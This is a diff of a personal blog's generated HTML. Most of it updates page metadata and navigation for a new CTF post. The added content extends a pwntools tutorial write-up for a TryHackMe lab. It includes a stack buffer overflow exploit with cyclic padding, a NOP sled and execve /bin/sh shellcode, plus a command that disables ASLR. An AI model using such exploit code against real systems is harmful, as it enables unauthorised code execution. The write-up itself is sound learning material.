@@ -6,30 +6,22 @@
   <meta name="keywords" content=" Linux ">
   <meta name="description" content="Intro To Pwntools | Peanutstick">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<meta name="description" content="https:&#x2F;&#x2F;tryhackme.com&#x2F;room&#x2F;introtopwntools So I’m connected with ssh on the box: Checksec Does Intro2pwn1 have FULL RELROFull RELRO makes the entire GOT read-only which removes the ability to perform">
+<meta name="description" content="NoteJohn was working on his smart home appliances when he noticed weird traffic going across the network. Can you help him figure out what these weird network communications are?  nampnmap -A -sV -p-">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Intro To Pwntools">
-<meta property="og:url" content="https://peanutstick.github.io/post/Intro%20To%20Pwntools.html">
+<meta property="og:title" content="CTF Bugged">
+<meta property="og:url" content="https://peanutstick.github.io/post/Untitled.html">
 <meta property="og:site_name" content="Peanutstick">
-<meta property="og:description" content="https:&#x2F;&#x2F;tryhackme.com&#x2F;room&#x2F;introtopwntools So I’m connected with ssh on the box: Checksec Does Intro2pwn1 have FULL RELROFull RELRO makes the entire GOT read-only which removes the ability to perform">
+<meta property="og:description" content="NoteJohn was working on his smart home appliances when he noticed weird traffic going across the network. Can you help him figure out what these weird network communications are?  nampnmap -A -sV -p-">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://i.imgur.com/dSAu5n5.png">
-<meta property="og:image" content="https://i.imgur.com/K98beFt.png">
-<meta property="og:image" content="https://i.imgur.com/JdGkLYE.png">
-<meta property="og:image" content="https://i.imgur.com/x6xQ9N2.png">
-<meta property="og:image" content="https://i.imgur.com/INR4Sfc.png">
-<meta property="og:image" content="https://i.imgur.com/IrTNpxt.png">
-<meta property="og:image" content="https://i.imgur.com/hV2EIHW.png">
-<meta property="og:image" content="https://i.imgur.com/7QOFFcM.png">
-<meta property="og:image" content="https://i.imgur.com/FRyYlmI.png">
-<meta property="og:image" content="https://i.imgur.com/5e0fIIP.png">
-<meta property="og:image" content="https://i.imgur.com/ULfM5je.png">
-<meta property="article:published_time" content="2023-02-28T23:40:52.000Z">
-<meta property="article:modified_time" content="2023-03-05T09:37:47.846Z">
+<meta property="og:image" content="https://i.imgur.com/KFWJeod.png">
+<meta property="og:image" content="https://i.imgur.com/xMLyBtO.png">
+<meta property="og:image" content="https://i.imgur.com/UYmi5Ni.png">
+<meta property="article:published_time" content="2023-03-09T01:00:52.000Z">
+<meta property="article:modified_time" content="2023-03-07T18:29:38.705Z">
 <meta property="article:author" content="Peanutstick">
 <meta property="article:tag" content="Linux">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://i.imgur.com/dSAu5n5.png">
+<meta name="twitter:image" content="https://i.imgur.com/KFWJeod.png">
 
 
 <link rel="icon" href="/img/avatar.jpg">
@@ -145,7 +137,7 @@
     <li>
         <div class="all active" data-rel="All">All
             
-                <small>(99)</small>
+                <small>(100)</small>
             
         </div>
     </li>
@@ -156,7 +148,7 @@
                     <div data-rel="CTF">
                         
                         CTF
-                        <small>(52)</small>
+                        <small>(53)</small>
                         
                     </div>
                     
@@ -268,8 +260,8 @@
         
     </div>
 </div>
-<input type="hidden" id="yelog_site_posts_number" value="99">
-<input type="hidden" id="yelog_site_word_count" value="49.6k">
+<input type="hidden" id="yelog_site_posts_number" value="100">
+<input type="hidden" id="yelog_site_word_count" value="50.9k">
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
     <span id="busuanzi_value_site_pv"></span>
@@ -350,6 +342,14 @@
 
     
     <nav id="title-list-nav">
+        
+        <a  class="All CTF "
+           href="/post/Untitled.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Bugged">CTF Bugged</span>
+            <span class="post-date" title="2023-03-09 02:00:52">2023/03/09</span>
+        </a>
         
         <a  class="All Security "
            href="/post/Intro%20To%20Pwntools.html"
@@ -1188,12 +1188,12 @@
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2023-03-05 10:37:47'>2023-03-01 00:40</time>
+            Created At : <time class="date" title='Updated At: 2023-03-05 12:24:54'>2023-03-01 00:40</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:432</span>
+        <span>Count:737</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -1212,7 +1212,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Checksec"><span class="toc-text">Checksec</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#cyclic"><span class="toc-text">cyclic</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Networking"><span class="toc-text">Networking</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Checksec"><span class="toc-text">Checksec</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#cyclic"><span class="toc-text">cyclic</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Networking"><span class="toc-text">Networking</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Shellcraft"><span class="toc-text">Shellcraft</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1301,7 +1301,60 @@ your exploit.
 
 Sincerely,
 dizmas<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="https://i.imgur.com/ULfM5je.png"></p>
+<p><img src="https://i.imgur.com/ULfM5je.png"><br>So we have a copy of the service on the port 1336 of the service on the port 1337.<br>In this exemple we don’t have to change the payload or add nops, it’s just to show how to use the network.</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+connect <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> <span class="token number">1337</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>connect<span class="token punctuation">.</span>recvn<span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+payload <span class="token operator">=</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">32</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span>
+connect<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>connect<span class="token punctuation">.</span>recvn<span class="token punctuation">(</span><span class="token number">34</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h1 id="Shellcraft"><a href="#Shellcraft" class="headerlink" title="Shellcraft"></a>Shellcraft</h1><p>For this challenge we nee d to disable ASLR (address space layout randomization).<br>This randomise where in memory the executable is loaded, so if we found the location of a function, the next time we run it the function will be somewhere else.</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token number">0</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> /proc/sys/kernel/randomize_va_space<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>ok, we don’t have the right to do it.<br>use the script instead.</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> ./disable_aslr.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://i.imgur.com/BXYAhcD.png"></p>
+<p>Let’s find the EIP, I’m creating a string with cyclic 100, then I open the program with gdb an past the string.<br>The EIP is at taaa<br><img src="https://i.imgur.com/UX7ibbD.png"></p>
+<p><img src="https://i.imgur.com/BljK7cr.png"></p>
+<p>So I have to print 77*”A” and rest for the EIP.<br>Now we gonna use a python script:</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+padding <span class="token operator">=</span> cyclic<span class="token punctuation">(</span>cyclic_find<span class="token punctuation">(</span><span class="token string">'taaa'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+eip <span class="token operator">=</span> p32<span class="token punctuation">(</span><span class="token number">0xffffd480</span><span class="token operator">+</span><span class="token number">200</span><span class="token punctuation">)</span>
+
+nop_slide <span class="token operator">=</span> <span class="token string">"\x90"</span><span class="token operator">*</span><span class="token number">1000</span>
+
+shellcode <span class="token operator">=</span> <span class="token string">"\xcc"</span>
+
+payload <span class="token operator">=</span> padding <span class="token operator">+</span> eip <span class="token operator">+</span> nop_slide <span class="token operator">+</span> shellcode
+
+<span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>I put the output in the file payload:<br><img src="https://i.imgur.com/FFXj5IQ.png"></p>
+<p>Now let’s create the shellcode wih shellcraft.</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">shellcraft i386.linux.execve <span class="token string">"/bin///sh"</span> <span class="token string">"['sh', '-p']"</span> -f a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://i.imgur.com/UDB3GmE.png"></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+proc <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./intro2pwnFinal'</span><span class="token punctuation">)</span>
+
+padding <span class="token operator">=</span> cyclic<span class="token punctuation">(</span>cyclic_find<span class="token punctuation">(</span><span class="token string">'taaa'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+eip <span class="token operator">=</span> p32<span class="token punctuation">(</span><span class="token number">0xffffd510</span><span class="token operator">+</span><span class="token number">200</span><span class="token punctuation">)</span>
+
+nop_slide <span class="token operator">=</span> <span class="token string">"\x90"</span><span class="token operator">*</span><span class="token number">1000</span>
+
+shellcode <span class="token operator">=</span> <span class="token string">"jhh\x2f\x2f\x2fsh\x2fbin\x89\xe3jph\x01\x01\x01\x01\x814\x24ri\x01,1\xc9Qj\x07Y\x01\xe1Qj\x08Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"</span>
+
+<span class="token comment">#shellcode = "\xcc"</span>
+
+payload <span class="token operator">=</span> padding <span class="token operator">+</span> eip <span class="token operator">+</span> nop_slide <span class="token operator">+</span> shellcode
+
+proc<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+
+proc<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>My EIP was wrong, didn’t say the value 0xffffd510 in gdb.</p>
 
       
        
